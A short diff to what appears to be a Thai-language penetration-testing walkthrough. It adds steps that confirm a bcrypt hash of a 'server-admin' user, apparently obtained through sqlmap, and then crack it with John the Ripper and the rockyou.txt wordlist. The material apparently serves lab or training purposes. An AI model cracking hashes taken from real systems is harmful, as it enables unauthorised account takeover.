@@ -177,3 +177,16 @@ nano hashes.txt
 
 3. วาง bcrypt hash ที่ได้จาก sqlmap (ในที่นี้ใส่เฉพาะของ user server-admin)
 > 📌 แนะนำให้ลบ hash อื่น ๆ ออก เพื่อให้ crack ได้เร็วขึ้น
+
+4. ตรวจสอบว่า hash ถูกบันทึกเรียบร้อย:
+
+```bash
+cat hashes.txt
+```
+
+# 🧂 Crack Bcrypt Hash ด้วย John the Ripper
+📦 เราจะใช้ john คู่กับ rockyou.txt ในการ brute-force:
+
+```bash
+john --format=bcrypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
